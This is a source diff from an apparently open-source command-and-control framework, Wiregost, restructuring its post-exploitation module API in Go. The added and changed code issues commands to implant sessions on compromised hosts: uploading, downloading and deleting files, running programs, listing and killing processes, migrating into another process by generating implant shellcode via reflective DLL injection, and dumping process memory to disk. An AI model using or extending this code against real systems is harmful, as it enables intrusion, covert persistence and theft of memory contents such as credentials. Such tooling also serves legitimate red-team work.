@@ -26,32 +26,54 @@ import (
 	"path/filepath"
 	"time"
 
+	"github.com/evilsocket/islazy/tui"
 	"github.com/gogo/protobuf/proto"
+	clientpb "github.com/maxlandon/wiregost/protobuf/client"
 	ghostpb "github.com/maxlandon/wiregost/protobuf/ghost"
 	"github.com/maxlandon/wiregost/server/core"
+	"github.com/maxlandon/wiregost/server/generate"
 	"github.com/maxlandon/wiregost/util"
 )
 
-// GetSession - Returns the Session corresponding to the Module "Session" option, or nothing if not found.
-func (m *Module) GetSession() (session *core.Ghost, err error) {
+// Post - A type of module performing post-exploitation tasks
+type Post struct {
+	*Module
+	Session *core.Ghost
+}
+
+func NewPost() *Post {
+	post := &Post{&Module{}, nil}
+	return post
+}
+
+// This file contains all methods accessible by Post-modules for interacting with an implant session.
+// They are identical to the commands available in the console for using sessions
+// - Filesystem
+// - Info
+// - Priv
+// - Proc
+// - Execute
+
+// GetSession - Returns the Session corresponding to the Post "Session" option, or nothing if not found.
+func (m *Post) GetSession() (err error) {
 
 	// Check empty session
 	if m.Options["Session"].Value == "" {
-		return nil, errors.New("Provide a Session to run this module on.")
+		return errors.New("Provide a Session to run this module on.")
 	}
 
 	// Check connected session
 	if 0 < len(*core.Wire.Ghosts) {
 		for _, g := range *core.Wire.Ghosts {
 			if g.Name == m.Options["Session"].Value {
-				session = g
+				m.Session = g
 			}
 		}
 	}
 
-	if session == nil {
+	if m.Session == nil {
 		invalid := fmt.Sprintf("Invalid or non-connected session: %s", m.Options["Session"].Value)
-		return nil, errors.New(invalid)
+		return errors.New(invalid)
 	}
 
 	// Check valid platform
@@ -65,31 +87,24 @@ func (m *Module) GetSession() (session *core.Ghost, err error) {
 		platform = "linux"
 	}
 
-	if platform != session.OS {
-		return nil, errors.New("The session's target OS is not supported by this module")
+	if platform != m.Session.OS {
+		return errors.New("The session's target OS is not supported by this module")
 	}
 
-	return session, nil
+	return nil
 }
 
-// isPost - Checks if a module has a Session option, meaning its a post-module.
-func (m *Module) isPost() bool {
-
-	if _, ok := m.Options["Session"]; !ok {
-		return false
-	}
-	return true
-}
+// -----------------------------------------------------------------------------------------------------------//
+// [ FILESYSTEM METHODS ]
+// -----------------------------------------------------------------------------------------------------------//
 
 // Upload - Upload a file on the Session's target.
 // @src     => file to upload
 // @path    => path in which to upload the file (including file name)
 // @timeout => Desired timeout for the session command
-func (m *Module) Upload(src string, path string, timeout time.Duration) (result string, err error) {
-	if !m.isPost() {
-		return "", errors.New("Module is not a Post-Exploitation module")
-	}
-	sess, err := m.GetSession()
+func (m *Post) Upload(src string, path string, timeout time.Duration) (result string, err error) {
+
+	err = m.GetSession()
 	if err != nil {
 		return "", errors.New("Error finding ghost Session when uploading")
 	}
@@ -107,7 +122,7 @@ func (m *Module) Upload(src string, path string, timeout time.Duration) (result 
 		Data:    uploadGzip.Bytes(),
 	})
 
-	data, err = sess.Request(ghostpb.MsgUploadReq, timeout, data)
+	data, err = m.Session.Request(ghostpb.MsgUploadReq, timeout, data)
 	if err != nil {
 		return "", errors.New(err.Error())
 	}
@@ -118,11 +133,8 @@ func (m *Module) Upload(src string, path string, timeout time.Duration) (result 
 // @lpath   => local path in which to save the file
 // @rpath   => path to file to download (including file name)
 // @timeout => Desired timeout for the session command
-func (m *Module) Download(lpath string, rpath string, timeout time.Duration) (result string, err error) {
-	if !m.isPost() {
-		return "", errors.New("Module is not a Post-Exploitation module")
-	}
-	sess, err := m.GetSession()
+func (m *Post) Download(lpath string, rpath string, timeout time.Duration) (result string, err error) {
+	err = m.GetSession()
 	if err != nil {
 		return "", errors.New("Error finding ghost Session when uploading")
 	}
@@ -130,7 +142,7 @@ func (m *Module) Download(lpath string, rpath string, timeout time.Duration) (re
 	data, _ := proto.Marshal(&ghostpb.DownloadReq{
 		Path: rpath,
 	})
-	data, err = sess.Request(ghostpb.MsgDownloadReq, timeout, data)
+	data, err = m.Session.Request(ghostpb.MsgDownloadReq, timeout, data)
 
 	src := rpath
 	fileName := filepath.Base(src)
@@ -164,14 +176,12 @@ func (m *Module) Download(lpath string, rpath string, timeout time.Duration) (re
 // Remove - Remove a file/directory from the Session's target.
 // @path    => path to file/directory to remove
 // @timeout => Desired timeout for the session command
-func (m *Module) Remove(path string, timeout time.Duration) (result string, err error) {
-	if !m.isPost() {
-		return "", errors.New("Module is not a Post-Exploitation module")
-	}
-	sess, err := m.GetSession()
+func (m *Post) Remove(path string, timeout time.Duration) (result string, err error) {
+	err = m.GetSession()
 	if err != nil {
 		return "", errors.New("Error finding ghost Session when uploading")
 	}
+	sess := m.Session
 
 	data, _ := proto.Marshal(&ghostpb.RmReq{
 		Path: path,
@@ -195,14 +205,12 @@ func (m *Module) Remove(path string, timeout time.Duration) (result string, err 
 // ChangeDirectory - Change the implant session's current working directory.
 // @dir     => target directory
 // @timeout => Desired timeout for the session command
-func (m *Module) ChangeDirectory(dir string, timeout time.Duration) (result string, err error) {
-	if !m.isPost() {
-		return "", errors.New("Module is not a Post-Exploitation module")
-	}
-	sess, err := m.GetSession()
+func (m *Post) ChangeDirectory(dir string, timeout time.Duration) (result string, err error) {
+	err = m.GetSession()
 	if err != nil {
 		return "", errors.New("Error finding ghost Session when uploading")
 	}
+	sess := m.Session
 
 	data, _ := proto.Marshal(&ghostpb.CdReq{
 		Path: dir,
@@ -222,14 +230,12 @@ func (m *Module) ChangeDirectory(dir string, timeout time.Duration) (result stri
 // ListDirectory - List contents of a directory on the session's target.
 // @path    => target directory to list content from
 // @timeout => Desired timeout for the session command
-func (m *Module) ListDirectory(path string, timeout time.Duration) (result string, err error) {
-	if !m.isPost() {
-		return "", errors.New("Module is not a Post-Exploitation module")
-	}
-	sess, err := m.GetSession()
+func (m *Post) ListDirectory(path string, timeout time.Duration) (result string, err error) {
+	err = m.GetSession()
 	if err != nil {
 		return "", errors.New("Error finding ghost Session when uploading")
 	}
+	sess := m.Session
 
 	data, _ := proto.Marshal(&ghostpb.LsReq{
 		Path: path,
@@ -251,14 +257,12 @@ func (m *Module) ListDirectory(path string, timeout time.Duration) (result strin
 // @path    => path to the program to run
 // @args    => optional list of arguments to run with the program (if none, use []string{})
 // @timeout => Desired timeout for the session command
-func (m *Module) Execute(path string, args []string, timeout time.Duration) (result string, err error) {
-	if !m.isPost() {
-		return "", errors.New("Module is not a Post-Exploitation module")
-	}
-	sess, err := m.GetSession()
+func (m *Post) Execute(path string, args []string, timeout time.Duration) (result string, err error) {
+	err = m.GetSession()
 	if err != nil {
 		return "", errors.New("Error finding ghost Session when uploading")
 	}
+	sess := m.Session
 
 	data, _ := proto.Marshal(&ghostpb.ExecuteReq{
 		Path:   path,
@@ -277,4 +281,165 @@ func (m *Module) Execute(path string, args []string, timeout time.Duration) (res
 
 	res := fmt.Sprintf("Results:\n %s", resp.Result)
 	return res, nil
+}
+
+// -----------------------------------------------------------------------------------------------------------//
+// [ PROC METHODS ]
+// -----------------------------------------------------------------------------------------------------------//
+
+// Ps - Returns a list of all processes running on the session's target.
+func (m *Post) Ps(timeout time.Duration) (procs []*ghostpb.Process, err error) {
+	err = m.GetSession()
+	if err != nil {
+		return nil, errors.New("Error finding ghost Session when list processes")
+	}
+	sess := m.Session
+
+	data, _ := proto.Marshal(&ghostpb.PsReq{GhostID: sess.ID})
+	data, err = sess.Request(ghostpb.MsgPsReq, timeout, data)
+	if err != nil {
+		return nil, err
+	}
+
+	ps := ghostpb.Ps{}
+	err = proto.Unmarshal(data, &ps)
+	if err != nil {
+		return nil, err
+	}
+
+	return ps.Processes, nil
+}
+
+// Terminate - Terminate a program on the target, given a PID
+func (m *Post) Terminate(pid int, timeout time.Duration) (result string, err error) {
+	err = m.GetSession()
+	if err != nil {
+		return "", errors.New("Error finding ghost Session when list processes")
+	}
+	sess := m.Session
+
+	data, _ := proto.Marshal(&ghostpb.TerminateReq{Pid: int32(pid)})
+	data, err = sess.Request(ghostpb.MsgTerminate, timeout, data)
+	if err != nil {
+		return "", err
+	}
+
+	termResp := &ghostpb.Terminate{}
+	err = proto.Unmarshal(data, termResp)
+	if err != nil {
+		return "", err
+	}
+	if termResp.Err != "" {
+		return "", err
+	}
+
+	return "", nil
+}
+
+// GetPIDByName - Get the Process ID of a process given its name. Returns -1, err if no process is found
+func (m *Post) GetPIDByName(name string, timeout time.Duration) (pid int, err error) {
+
+	procs, err := m.Ps(timeout)
+	if err != nil {
+		return -1, err
+	}
+	for _, proc := range procs {
+		if proc.Executable == name {
+			return int(proc.Pid), nil
+		}
+	}
+	return -1, nil
+}
+
+// Migrate - Migrate to a process, given its PID, by generating and executing an implant as shellcode in the target.
+func (m *Post) Migrate(pid int, timeout time.Duration) (result string, err error) {
+	err = m.GetSession()
+	if err != nil {
+		return "", errors.New("Error finding ghost Session when list processes")
+	}
+	sess := m.Session
+
+	conf := getSessionGhostConfig(sess)
+	config := generate.GhostConfigFromProtobuf(conf)
+	config.Format = clientpb.GhostConfig_SHARED_LIB
+	config.ObfuscateSymbols = false
+	m.Event("Generating implant shellcode for migration")
+	dllPath, err := generate.GhostSharedLibrary(config)
+	if err != nil {
+		return "", err
+	}
+	shellcode, err := generate.ShellcodeRDI(dllPath, "", "")
+	if err != nil {
+		return "", err
+	}
+	data, _ := proto.Marshal(&ghostpb.MigrateReq{
+		Data: shellcode,
+		Pid:  uint32(pid),
+	})
+	m.Event("Migrating...")
+	data, err = sess.Request(ghostpb.MsgMigrateReq, timeout, data)
+	if err != nil {
+		return "", err
+	}
+	m.Event(tui.Green("Done"))
+
+	return "", nil
+}
+
+func getSessionGhostConfig(sess *core.Ghost) *clientpb.GhostConfig {
+	c2s := []*clientpb.GhostC2{}
+	c2s = append(c2s, &clientpb.GhostC2{
+		URL:      sess.ActiveC2,
+		Priority: uint32(0),
+	})
+	config := &clientpb.GhostConfig{
+		GOOS:   sess.OS,
+		GOARCH: sess.Arch,
+		Debug:  true,
+
+		MaxConnectionErrors: uint32(1000),
+		ReconnectInterval:   uint32(60),
+
+		Format:      clientpb.GhostConfig_SHELLCODE,
+		IsSharedLib: true,
+		C2:          c2s,
+	}
+	return config
+}
+
+// ProcDump - Dumps the memory of a process given its PID. Returns the path of the file
+// containing the dump, and an error
+func (m *Post) ProcDump(pid int, timeout time.Duration) (tmp string, err error) {
+	err = m.GetSession()
+	if err != nil {
+		return "", errors.New("Error finding ghost Session when list processes")
+	}
+	sess := m.Session
+
+	data, _ := proto.Marshal(&ghostpb.ProcessDumpReq{
+		Pid: int32(pid),
+	})
+
+	m.Event(fmt.Sprintf("Dumping memory of process %d", pid))
+	data, err = sess.Request(ghostpb.MsgProcessDumpReq, timeout, data)
+	if err != nil {
+		return "", err
+	}
+
+	procDump := &ghostpb.ProcessDump{}
+	proto.Unmarshal(data, procDump)
+	if procDump.Err != "" {
+		return "", err
+	}
+
+	hostname := sess.Hostname
+	temp := path.Base(fmt.Sprintf("procdump_%s_%d_*", hostname, pid))
+	f, err := ioutil.TempFile("", temp)
+	if err != nil {
+		return "", nil
+	}
+	f.Write(procDump.GetData())
+	m.Event(fmt.Sprintf("Process dump stored in %s\n", f.Name()))
+
+	return f.Name(), nil
 }
